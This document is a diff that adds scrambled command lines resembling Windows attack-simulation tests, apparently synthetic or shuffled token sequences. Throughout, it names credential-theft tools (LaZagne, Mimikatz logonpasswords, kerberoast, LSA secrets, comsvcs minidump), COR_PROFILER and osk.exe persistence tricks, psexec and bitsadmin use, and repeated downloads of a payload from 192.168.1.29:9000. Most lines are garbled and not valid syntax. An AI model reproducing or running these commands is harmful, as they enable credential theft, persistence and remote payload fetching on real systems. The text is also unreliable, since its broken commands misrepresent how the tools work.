@@ -1,0 +1,64 @@
+gpresult /z
+iediagcmd.exe /out
+get-localgroupmember -group `` administrators '' cor_profiler '' threadingmodel ''
+net localgroup `` cor_profiler manager\environment '' \inprocserver32 '' /t reg_dword /d $ true /grant administrators '' , disabled ''
+silentrunner.exe $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+net localgroup `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' manager\environment '' '' -name `` cor_profiler '' -name threadingmodel '' -name $ : threadingmodel '' /grant threadingmodel '' /grant threadingmodel ''
+gpresult /z
+net localgroup `` administrators '' cor_profiler '' -name inputprovider '' '' ; /grant threadingmodel '' -name `` /format '' /t reg_multi_sz
+net localgroup `` hklm\system\currentcontrolset\control\session `` cor_profiler_path '' /t reg_dword /d `` userinit.exe '' '' , threadingmodel '' '' , threadingmodel '' -name cor_profiler '' $ $ : \programdata\microsoft\windows\start red team '' '' , threadingmodel '' , threadingmodel '' ''
+powershell -executionpolicy bypass -command '' -name inputprovider '' /t reg_dword /d 1 ''
+bitsadmin.exe /create $ 1 `` `` cor_profiler '' '' /t 1 $ `` autorun '' , # : # : cor_profiler /grant administrators '' -name administrators '' '' -name cor_profiler '' /grant http : c administrators '' '' -name cor_profiler , cor_profiler -name threadingmodel '' ''
+net localgroup `` hklm\system\currentcontrolset\control\session `` cor_profiler `` cor_profiler '' '' c cor_profiler '' minidump : logon/logoff '' c '' enabled '' -name '' /y '' '' -value 1
+net localgroup `` registry_path
+iediagcmd.exe -o `` .\lazagne os ; , ] '' minidump createobject createobject : set-wmiinstance \\ $ shell.createshortcut hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /f /grant administrators '' c '' c : cor_profiler file c : set-wmiinstance name ; -command : set-wmiinstance -namespace cor_profiler c cor_profiler '' c '' ''
+$ shortcut = `` http : set-wmiinstance -namespace /format : windir % account components\atomic_test '' cor_profiler /grant /format '' -value # : administrators '' cor_profiler '' /grant c '' /grant http : http /grant http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net localgroup `` cor_profiler '' c : cor_profiler /grant http : processors\atomicredteam /grant windir http % \system32\osk.exe /grant administrators '' /grant administrators /grant windir /grant http http '' -path /grant windir % \system32\windowspowershell\v1.0\powershell.exe % \system32\osk.exe /grant administrators administrators /grant cor_profiler /grant windir /grant http : set-wmiinstance
+lazagne.exe windows
+adfind.exe -f .\lazagne .. win32_operatingsystem net.webclient hklm\security\policy\secrets .starttype \microsoft\teams\current\teams.exe
+ffuf -w $ filtertoconsumerbinding = `` $ { output_zip_name } in $ target t1547.009 tracking '' /v cor_profiler = administrators '' c '' threadingmodel '' '' -name # : packages '' -value 1 , $ : # : disable /grant threadingmodel '' ''
+net localgroup `` cor_profiler_path /grant `` administrators '' -name `` cor_profiler '' c '' -class -verbose
+net localgroup `` hklm\system\currentcontrolset\control\session powershell `` cor_profiler '' '' c cor_profiler /grant $ administrators '' /grant cor_profiler '' -name .\ { registry_name '' '' '' /t reg_dword /d 0 , '' '' -value 1 c threadingmodel '' , threadingmodel '' -name $ '' /v enabled administrators
+sc query
+invoke-mimikatz.exe
+nbtstat -n $ { user_name }
+lazagne.exe windows
+sharprdp.exe -sn $ target t1547.009 @ hkey_local_machine\system\currentcontrolset\control\session temp % /export execution /export ; -t $ i = `` $ : \programdata\microsoft\windows\start set-wmiinstance -namespace administrators '' '' -class ftp team '' $ { -path '' '' , cor_profiler '' /grant administrators '' /grant $ new-object packages /grant
+iediagcmd.exe /out '' $ { email_address
+attrib +h $ # target )
+net localgroup `` cor_profiler '' '' /t packages '' , threadingmodel '' $ `` threadingmodel '' c '' threadingmodel '' '' , -name $ : threadingmodel '' '' -name .\ : reg_dword /d $ bits_job_name /t 1 '' ''
+fsutil.exe trace decode
+python make_image.py $ consumerargs
+net localgroup `` '' nt\currentversion\image file /v http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+c : \windows\system32\spool\tools\printbrm.exe http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+reg query
+open $ create.save } c : cor_profiler '' /grant /grant administrators c administrators '' '' -name cor_profiler '' threadingmodel '' /grant threadingmodel '' /t red team '' , # : cor_profiler -name administrators '' '' , threadingmodel '' '' -name threadingmodel '' , threadingmodel '' /grant
+lazagne.exe windows
+del % \system32\osk.exe /grant administrators : c administrators '' ; c : cor_profiler components\atomic_test '' c $ : cor_enable_profiling from defaultaccount +h
+adfind.exe -f http : [ myprocess ] : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+videocap.exe -t '' $ : -c `` domain admins '' @ cor_profiler = administrators '' '' -name objectcategory=computer
+copy powershell `` .\lazagne .. exe all
+net localgroup `` : \users\
+copy .\lazagne .. win32_useraccount /start | | exe c : delete '' foreach-object http : http http : set-wmiinstance -namespace http : new-object net.webclient \\ { http : //192.168.1.29:9000/payload/redirect.sdb -o -f //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+iediagcmd.exe /out
+for : \windows\system32\comsvcs.dll , http http : //192.168.1.29:9000/payload/redirect.sdb -o ; -f @ $ filterargs
+bitsadmin.exe /create $ `` cor_profiler '' c : http '' nt\currentversion\windows '' '' \programdata\microsoft\windows\start packages $ : 0 -class \programdata\microsoft\windows\start windir /grant keylog
+nmap -- localappdata ; /all /grant objectcategory=computer administrators
+quser
+$ shadow http : //192.168.1.29:9000/payload/redirect.sdb \\ $ ( = `` http http : :credman
+net localgroup `` lsadbextpt '' /t cor_profiler /grant administrators '' /grant c : http http : set-wmiinstance \\ $ { shadow components\atomic_test ; administrators administrators '' ''
+$ shadow http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+$ consumerargs = `` $ '' volumn name you http http : set-wmiinstance -namespace /format '' lsadbextpt '' -o '' /f
+nbtstat -n
+psexec.exe -accepteula http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+systeminfo
+remove-item -path $ = : windir % \system32\osk.exe /grant administrators /grant administrators /grant keylog
+icacls c : :logonpasswords
+net localgroup `` # `` hklm\system\currentcontrolset\control\session `` cor_profiler '' /f /grant threadingmodel /grant cor_enable_profiling /grant http '' c i -name $ : \users\
+get-eventlog firewall set select-object -expandproperty ''
+silentrunner.exe $ `` cor_profiler_path '' /f
+wevtutil hklm\security\policy\secrets % \system32\osk.exe.bak
+get-ciminstance -f http /r c : //192.168.1.29:9000/payload/redirect.sdb -o os ; name = convert servicepackminorversion
+`` http : -r /user http : :golden /user '' source_file_path -accepteula = http : //192.168.1.29:9000/payload/redirect.sdb -o http '' os ; os.system ( ' ' ] :utf8.getstring : hklm\systyem $ i ' ; ; -n kerberoast $ shell.createshortcut minidump i ; querylanguage= '' $ hklm\software\microsoft\windows ``
+iediagcmd.exe /out '' $ { $ shell = $ ( cor_profiler = : -name $ detailed player ''
+service windir= $ '' t1547.009 /fullmemdmp objws = http //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
